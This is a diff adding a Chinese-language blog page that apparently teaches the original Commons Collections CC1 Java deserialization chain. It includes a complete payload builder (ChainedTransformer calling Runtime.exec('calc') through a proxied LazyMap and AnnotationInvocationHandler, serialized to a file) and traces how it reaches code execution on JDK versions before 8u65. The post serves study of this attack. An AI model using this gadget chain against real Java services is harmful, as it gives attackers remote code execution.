@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="JAVA反序列化CC链1补充  前言  在前面，我们已经彻底分析了CC链1的执行流程，至于这个补充，是因为我们讲的那个CC1是改良版本的，真实的版本和我们讲的略有差异，所以我们再次进行分析，此次分析，需要我们掌握JAVA的动态代理，没准备的师傅可自行了解或参考我的文章，闲言少叙，我们开始 书接上回  既然是基于CC1链的再分析，那肯定有些东西是不会变的，那就是最终执行命令的逻辑  既然标注的地方不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA反序列化CC链1补充">
+<meta property="og:url" content="http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="JAVA反序列化CC链1补充  前言  在前面，我们已经彻底分析了CC链1的执行流程，至于这个补充，是因为我们讲的那个CC1是改良版本的，真实的版本和我们讲的略有差异，所以我们再次进行分析，此次分析，需要我们掌握JAVA的动态代理，没准备的师傅可自行了解或参考我的文章，闲言少叙，我们开始 书接上回  既然是基于CC1链的再分析，那肯定有些东西是不会变的，那就是最终执行命令的逻辑  既然标注的地方不">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/1.png">
+<meta property="og:image" content="http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/2.png">
+<meta property="og:image" content="http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/3.png">
+<meta property="og:image" content="http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/4.png">
+<meta property="og:image" content="http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/5.png">
+<meta property="article:published_time" content="2025-04-15T11:06:54.000Z">
+<meta property="article:modified_time" content="2025-04-15T12:48:16.567Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="WEB-安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>JAVA反序列化CC链1补充</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/04/14/JAVA-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&text=JAVA反序列化CC链1补充"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&is_video=false&description=JAVA反序列化CC链1补充"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JAVA反序列化CC链1补充&body=Check out this article: http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&name=JAVA反序列化CC链1补充&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&t=JAVA反序列化CC链1补充"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">JAVA反序列化CC链1补充</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">书接上回</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">讨论</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        JAVA反序列化CC链1补充
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-15T11:06:54.000Z" itemprop="datePublished">2025-04-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WEB-%E5%AE%89%E5%85%A8/" rel="tag">WEB-安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">JAVA反序列化CC链1补充</h1>
+
+<h2>前言</h2>
+
+<p><strong>在前面，我们已经彻底分析了CC链1的执行流程，至于这个补充，是因为我们讲的那个CC1是改良版本的，真实的版本和我们讲的略有差异，所以我们再次进行分析，此次分析，需要我们掌握JAVA的动态代理，没准备的师傅可自行了解或参考我的文章，闲言少叙，我们开始</strong></p>
+<h2>书接上回</h2>
+
+<p><strong>既然是基于CC1链的再分析，那肯定有些东西是不会变的，那就是最终执行命令的逻辑</strong></p>
+<p><img src="/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/1.png" alt="1"></p>
+<p><strong>既然标注的地方不变，那要执行命令，就是找谁能执行ChainedTransformer里的transform函数，那我们直接去找使用过该函数的地方</strong></p>
+<p><img src="/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/2.png" alt="2"></p>
+<p><strong>我们能看到我们以前使用的TransformedMap类，毕竟找的方法都是一致的，这次，我们使用LazyMap类，LazyMap中的get方法可以执行transform函数，只要factory可控就行</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>我们找到其decorate函数并发现参数是可控的，而且传入类型是符合的，我们完全可以传入我们构造好的ChainedTransformer，接下来就是继续去寻找哪里调用了get方法，最好能是某个可控类中的readObject方法调用的</strong></p>
+<p><strong>可惜，我们未能如愿，但是在AnnotationInvocationHandler类中找到了调用get方法的地方</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues; </span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);  <span class="comment">//此处调用了get方法，而且memberValues参数是可控的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>我们继续看，本来我们应该接着去找哪里调用了invoke方法，可是这个方法，越想越奇怪，我们赶忙去看看这个类继承于哪个接口</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>这个类竟然继承于InvocationHandler接口，这是一个动态代理的接口，所以我们无需去找谁调用了invoke方法，只要我们声明一个代理类，将AnnotationInvocationHandler类作为实例化代理类的第三个参数，然后我们不管调用该代理类的任何方法，我们都能跳到AnnotationInvocationHandler中的invoke方法</strong></p>
+<p><strong>说了半天，我们该如何实现呢，首先，我们还是得找到链子的开端，不然呢，我们不知道去代理哪个类，这其实很难找的，这里作者选用的链子的起始类依然是AnnotationInvocationHandler类，与前面的CC1的链子开端是一样的，那我们继续想，这个AnnotationInvocationHandler类在构造时只有两个参数，第一个是注解类，第二个是一个Map类，注解类在其readObject方法里面几乎是无用的，那我们只能寄希望于Map类，那这个Map，我们到底该如何传呢，结合我们前面的分析，没错，传入一个Map的代理类</strong></p>
+<p><strong>payload：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">ChainedTransformer</span> <span class="variable">chainedtransformer</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">  <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,chainedtransformer);</span><br><span class="line"></span><br><span class="line">  <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">  <span class="comment">//获得构造器</span></span><br><span class="line">  <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">  aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="comment">//o1作为的是代理类的第三个参数</span></span><br><span class="line">  <span class="type">InvocationHandler</span> <span class="variable">o1</span> <span class="operator">=</span> (InvocationHandler)aihConstructor.newInstance(Target.class,lazyMap);</span><br><span class="line">  <span class="comment">//构造好我们的Map代理类</span></span><br><span class="line">  <span class="type">Map</span> <span class="variable">map_proxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,o1);</span><br><span class="line"></span><br><span class="line">  <span class="type">Object</span> <span class="variable">o2</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, map_proxy);</span><br><span class="line"></span><br><span class="line">  SerializeUtil.serialize(o2,<span class="string">&quot;o2.bin&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>最前面的没啥好说的，LazyMap的构造也没啥好说的，前面已经说过了其参数可控的特性，所以我们传入chainedtransformer</strong></p>
+<p><strong>前面说过了，作者依然选用AnnotationInvocationHandler作为链子的开端，这里我们第二个参数传入的是一个代理的Map类，传入Map类是因为该类接受的第二个参数就是Map类型，至于为啥一定要传入的是代理Map类，我们前面笼统的说过了，这里我们展开说说它的详细调用过程</strong></p>
+<p><strong>首先o2的反序列化被读入到AnnotationInvocationHandler类中的readObject方法中</strong></p>
+<p><img src="/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/3.png" alt="3"></p>
+<p><strong>当执行到红框所指的位置时，由于memberValues是我们传入的代理Map类，那么，根据代理的特性，会执行Map代理类中InvocationHandler类里面的invoke方法，由于这个代理Map类，我们传入的InvocationHandler其实就是o1，所以，此时就会执行o1中的invoke方法</strong></p>
+<p><strong>那么o1是啥呢，其实o1还是AnnotationInvocationHandler类，所以我们跟进invoke方法</strong></p>
+<p><img src="/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/4.png" alt="4"></p>
+<p><strong>发现要经过两个判断，但此时都轻松通过，因为method.getName()获取到的是entrySet[动态代理的知识]，所以说判断轻松通过，memberValues.get(member)这里，因为执行的是o1中的invoke方法，所以memberValues就是lazyMap[因为我们在实例化o1时传入的就是lazyMap]，到这里我们就发现，此时将执行lazyMap.get(member)，就会走到我们之前找到的地方</strong></p>
+<p><img src="/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/5.png" alt="5"></p>
+<p><strong>此时只要通过这个if判断，我们就能执行factory.transform(key)了，而factory我们早已经控制为chainedtransformer</strong></p>
+<p><strong>此处的map是我们先前传入的hashMap，里面是空的，所以也轻松通过，成功RCE</strong></p>
+<p><strong>这就是一定要传入代理类的原因，传入代理类，才能跳到lazyMap的get方法之中</strong></p>
+<h2>讨论</h2>
+
+<p><strong>但是，要说的一定是，这条CC链1无论是我们之前分析的改版，还是现在分析的原版，都是有JDK的版本限制的，就是8u65之前，8u65之后，随着AnnotationInvocationHandler类中的readObject方法的改写，使这条链永远的成为了过去式</strong></p>
+<h2>参考资料</h2>
+
+<p>【Java反序列化CommonsCollections篇(二)-最好用的CC链】<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1yP4y1p7N7?vd_source=c210ec42fbb60565fb74b1baf7a2c3ef">https://www.bilibili.com/video/BV1yP4y1p7N7?vd_source=c210ec42fbb60565fb74b1baf7a2c3ef</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">JAVA反序列化CC链1补充</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">书接上回</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">讨论</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&text=JAVA反序列化CC链1补充"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&is_video=false&description=JAVA反序列化CC链1补充"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JAVA反序列化CC链1补充&body=Check out this article: http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&title=JAVA反序列化CC链1补充"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
